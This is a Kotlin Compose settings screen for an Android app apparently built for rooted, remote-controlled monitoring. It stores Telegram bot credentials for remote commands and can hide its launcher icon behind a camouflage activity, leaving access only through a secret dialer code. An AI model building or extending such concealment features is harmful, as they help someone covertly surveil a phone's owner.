package com.system.superiormonitor.ui

import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import android.content.ComponentName
import android.content.pm.PackageManager
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.Spring
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.spring
import androidx.compose.ui.draw.scale
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import com.system.superiormonitor.theme.*

@Composable
fun SettingsScreen(
    isRootEnabled: Boolean,
    isInternetConnected: Boolean,
    botToken: String,
    chatId: String,
    ownerUserId: String,
    onBotTokenChange: (String) -> Unit,
    onChatIdChange: (String) -> Unit,
    onOwnerIdChange: (String) -> Unit,
    isBotRunning: Boolean,
    onSave: () -> Unit
) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    var isLauncherHidden by remember {
        mutableStateOf(
            context.packageManager.getComponentEnabledSetting(
                ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
            ) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        )
    }
    
    var showLauncherSetupDialog by remember { mutableStateOf(false) }
    var showLauncherWarningDialog by remember { mutableStateOf(false) }
    var showCredentialsDialog by remember { mutableStateOf(false) }
    var tempBotToken by remember { mutableStateOf(botToken) }
    var tempChatId by remember { mutableStateOf(chatId) }
    var tempOwnerId by remember { mutableStateOf(ownerUserId) }
    var expandedInfo by remember { mutableStateOf<String?>(null) }

    if (showCredentialsDialog) {
        AlertDialog(
            onDismissRequest = { showCredentialsDialog = false },
            title = { Text("Bot Credentials", color = TextPrimary) },
            text = {
                Column {
                    CredentialField(
                        label = "Bot Token",
                        value = tempBotToken,
                        onValueChange = { tempBotToken = it },
                        isSecret = true,
                        placeholder = "Enter Telegram Bot Token"
                    )
                    Spacer(modifier = Modifier.height(10.dp))
                    CredentialField(
                        label = "Chat ID",
                        value = tempChatId,
                        onValueChange = { tempChatId = it },
                        isSecret = true,
                        iconType = SecretIconType.EYE,
                        placeholder = "Enter Target Chat ID"
                    )
                    Spacer(modifier = Modifier.height(10.dp))
                    CredentialField(
                        label = "Owner User ID",
                        value = tempOwnerId,
                        onValueChange = { tempOwnerId = it },
                        isSecret = true,
                        iconType = SecretIconType.EYE,
                        placeholder = "Enter Owner User ID"
                    )
                }
            },
            containerColor = OuterCardSurface,
            shape = RoundedCornerShape(24.dp),
            confirmButton = {
                Button(
                    onClick = {
                        onBotTokenChange(tempBotToken.trim())
                        onChatIdChange(tempChatId.trim())
                        onOwnerIdChange(tempOwnerId.trim())
                        showCredentialsDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
                ) {
                    Text("Save Credentials", color = Background)
                }
            },
            dismissButton = {
                TextButton(onClick = { showCredentialsDialog = false }) {
                    Text("Cancel", color = TextSecondary)
                }
            }
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp)
            .padding(bottom = 32.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        // ── System Checks Card ──
        OuterCard {
            SectionTitle("System Checks", Icons.Default.Build)
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                StatusRow("Root Access", isRootEnabled, showDivider = true)
                StatusRow("Internet Connectivity", isInternetConnected, showDivider = false)
            }
        }

        // ── Credentials Card ──
        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Bot Credentials", Icons.Default.Lock)
                IconButton(onClick = { expandedInfo = if (expandedInfo == "credentials") null else "credentials" }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Default.Info, contentDescription = "Info", tint = TextSecondary, modifier = Modifier.size(22.dp))
                }
            }
            AnimatedVisibility(visible = expandedInfo == "credentials") {
                Text(
                    "Get your bot token from BotFather and get your chat ID and owner ID using Rose bot (/id).",
                    color = TextSecondary,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                Column(modifier = Modifier.padding(16.dp)) {
                    val isConfigured = botToken.isNotEmpty() && chatId.isNotEmpty() && ownerUserId.isNotEmpty()
                    val addButtonText = if (isConfigured) "Replace Credentials" else "Add Credentials"

                    Button(
                        onClick = { 
                            tempBotToken = botToken
                            tempChatId = chatId
                            tempOwnerId = ownerUserId
                            showCredentialsDialog = true 
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isConfigured) AccentGreen.copy(alpha = 0.15f) else AccentGreen,
                            contentColor = if (isConfigured) AccentGreen else Color.White
                        ),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Text(addButtonText, fontWeight = FontWeight.SemiBold)
                    }

                    Spacer(modifier = Modifier.height(14.dp))
        
                    var buttonState by remember { mutableStateOf(0) }
                    val widthFraction by animateFloatAsState(
                        targetValue = if (buttonState == 1) 0.15f else 1f,
                        animationSpec = spring(dampingRatio = Spring.DampingRatioMediumBouncy)
                    )
                    val cornerRadius by androidx.compose.animation.core.animateDpAsState(
                        targetValue = if (buttonState == 1) 24.dp else 12.dp,
                        animationSpec = androidx.compose.animation.core.tween(300)
                    )
                    val bgColor by androidx.compose.animation.animateColorAsState(
                        targetValue = when (buttonState) {
                            1 -> SuccessGreen
                            2 -> ErrorRed
                            else -> AccentGreen
                        },
                        animationSpec = androidx.compose.animation.core.tween(300)
                    )
                    val offsetX by androidx.compose.animation.core.animateFloatAsState(
                        targetValue = if (buttonState == 2) arrayOf(-15f, 15f, -15f, 15f, 0f).random() else 0f,
                        animationSpec = spring(dampingRatio = Spring.DampingRatioHighBouncy)
                    )

                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
                        Button(
                            onClick = {
                                if (buttonState == 0) {
                                    val isTokenValid = botToken.matches(Regex("^[0-9]+:[a-zA-Z0-9_-]+$"))
                                    val isChatValid = chatId.matches(Regex("^-?[0-9]+$"))
                                    val isOwnerValid = ownerUserId.matches(Regex("^[0-9]+$"))
                                    
                                    if (isTokenValid && isChatValid && isOwnerValid) {
                                        buttonState = 1
                                        onSave()
                                        scope.launch {
                                            delay(1500)
                                            buttonState = 0
                                        }
                                    } else {
                                        buttonState = 2
                                        scope.launch {
                                            delay(1500)
                                            buttonState = 0
                                        }
                                    }
                                }
                            },
                            modifier = Modifier.fillMaxWidth(widthFraction).height(48.dp).offset(x = offsetX.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = bgColor),
                            shape = RoundedCornerShape(cornerRadius),
                            contentPadding = PaddingValues(0.dp)
                        ) {
                            androidx.compose.animation.AnimatedContent(targetState = buttonState, label = "btn") { state ->
                                when (state) {
                                    0 -> Text("Update Credentials", color = Background)
                                    1 -> Icon(Icons.Default.Check, contentDescription = "Saved", tint = Background)
                                    2 -> Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.Warning, contentDescription = "Error", tint = Background, modifier = Modifier.size(18.dp))
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text("Invalid Format", color = Background)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Launcher Visibility", Icons.Default.Visibility)
                IconButton(onClick = { expandedInfo = if (expandedInfo == "launcher") null else "launcher" }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Default.Info, contentDescription = "Info", tint = TextSecondary, modifier = Modifier.size(22.dp))
                }
            }
            AnimatedVisibility(visible = expandedInfo == "launcher") {
                Text(
                    "After disabling this icon the app only will be accessible through dialer code *#*#677#*#* or bot command /settings.",
                    color = TextSecondary,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                val subtitleColor = if (!isLauncherHidden) SuccessGreen else WarningAmber
                Row(
                    modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 14.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Launcher Icon", style = MaterialTheme.typography.bodyLarge, color = TextPrimary)
                        Text(if (!isLauncherHidden) "Shown" else "Hidden", style = MaterialTheme.typography.bodySmall, color = subtitleColor)
                    }
                    TactileSwitch(
                        checked = !isLauncherHidden,
                        onCheckedChange = { isChecked ->
                            if (!isChecked) {
                                showLauncherSetupDialog = true
                            } else {
                                val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
                                val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
                                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                                isLauncherHidden = false
                                Toast.makeText(context, "Launcher Icon Unhidden", Toast.LENGTH_SHORT).show()
                            }
                        }
                    )
                }
            }
        }

        if (showLauncherSetupDialog) {
            AlertDialog(
                onDismissRequest = { showLauncherSetupDialog = false },
                title = { Text("Hide Launcher Icon?", color = TextPrimary) },
                text = { Text("Please make sure that you successfully set-up the application and responding by telegram command. otherwise if Code failed you will be locked out.", color = TextSecondary) },
                containerColor = OuterCardSurface,
                shape = RoundedCornerShape(24.dp),
                confirmButton = {
                    Button(
                        onClick = {
                            showLauncherSetupDialog = false
                            if (isBotRunning) {
                                showLauncherWarningDialog = true
                            } else {
                                Toast.makeText(context, "Cannot hide icon: Bot is not running!", Toast.LENGTH_LONG).show()
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
                    ) {
                        Text("Continue", color = Background)
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showLauncherSetupDialog = false }) {
                        Text("Cancel", color = TextSecondary)
                    }
                }
            )
        }

        if (showLauncherWarningDialog) {
            AlertDialog(
                onDismissRequest = { showLauncherWarningDialog = false },
                title = { Text("Dialer Code Note", color = TextPrimary) },
                text = { Text("Please note that code \n\n*#*#677#*#*\n\nto access this app through dialer.", color = TextSecondary) },
                containerColor = OuterCardSurface,
                shape = RoundedCornerShape(24.dp),
                confirmButton = {
                    Button(
                        onClick = {
                            showLauncherWarningDialog = false
                            val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
                            val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
                            try {
                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                            } catch (e: Exception) {
                                // Fallback: OS prevented disabling all launchers (Device Admin restriction).
                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                            }
                            isLauncherHidden = true
                            Toast.makeText(context, "Launcher Icon Hidden", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
                    ) {
                        Text("Noted", color = Background)
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showLauncherWarningDialog = false }) {
                        Text("Cancel", color = TextSecondary)
                    }
                }
            )
        }

        // ── App Info Card ──
        OuterCard {
            SectionTitle("About", Icons.Default.Info)
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                Column(modifier = Modifier.padding(horizontal = 16.dp, vertical = 12.dp)) {
                    InfoRow("App Name", "SuperiorMonitor")
                    HorizontalDivider(color = DividerColor, modifier = Modifier.padding(vertical = 4.dp))
                    InfoRow("Author", "@sandeshsahu1")
                    HorizontalDivider(color = DividerColor, modifier = Modifier.padding(vertical = 4.dp))
                    InfoRow("Architecture", "Clean Architecture + MVVM")
                    HorizontalDivider(color = DividerColor, modifier = Modifier.padding(vertical = 4.dp))
                    InfoRow("Root Library", "libsu (topjohnwu)")
                    HorizontalDivider(color = DividerColor, modifier = Modifier.padding(vertical = 4.dp))
                    InfoRow("UI Framework", "Jetpack Compose / Material 3")
                }
            }
        }
    }
}

@Composable
private fun InfoRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.Top
    ) {
        Text(label, style = MaterialTheme.typography.bodyMedium, color = TextSecondary, modifier = Modifier.weight(1f).padding(end = 8.dp))
        Text(value, style = MaterialTheme.typography.bodyMedium, color = TextPrimary, modifier = Modifier.weight(1.5f), textAlign = androidx.compose.ui.text.style.TextAlign.End)
    }
}

enum class SecretIconType { LOCK, EYE }

@Composable
private fun CredentialField(
    label: String,
    value: String,
    onValueChange: (String) -> Unit,
    isSecret: Boolean = false,
    iconType: SecretIconType = SecretIconType.LOCK,
    placeholder: String = ""
) {
    var showSecret by remember { mutableStateOf(false) }

    Column {
        Text(label, style = MaterialTheme.typography.labelMedium, color = TextSecondary)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = value,
            onValueChange = onValueChange,
            placeholder = { Text(placeholder, style = MaterialTheme.typography.bodyMedium, color = TextSecondary.copy(alpha = 0.5f)) },
            modifier = Modifier.fillMaxWidth(),
            textStyle = MaterialTheme.typography.bodyMedium.copy(color = TextPrimary),
            singleLine = true,
            visualTransformation = if (isSecret && !showSecret) PasswordVisualTransformation() else VisualTransformation.None,
            trailingIcon = {
                if (isSecret) {
                    IconButton(onClick = { showSecret = !showSecret }) {
                        val icon = if (iconType == SecretIconType.LOCK) {
                            if (showSecret) Icons.Default.LockOpen else Icons.Default.Lock
                        } else {
                            if (showSecret) Icons.Default.VisibilityOff else Icons.Default.Visibility
                        }
                        Icon(icon, contentDescription = null, tint = TextSecondary, modifier = Modifier.size(18.dp))
                    }
                }
            },
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = AccentGreen,
                unfocusedBorderColor = DividerColor,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary,
                focusedContainerColor = InnerCardSurface,
                unfocusedContainerColor = InnerCardSurface,
                cursorColor = AccentGreen
            ),
            shape = RoundedCornerShape(10.dp)
        )
    }
}
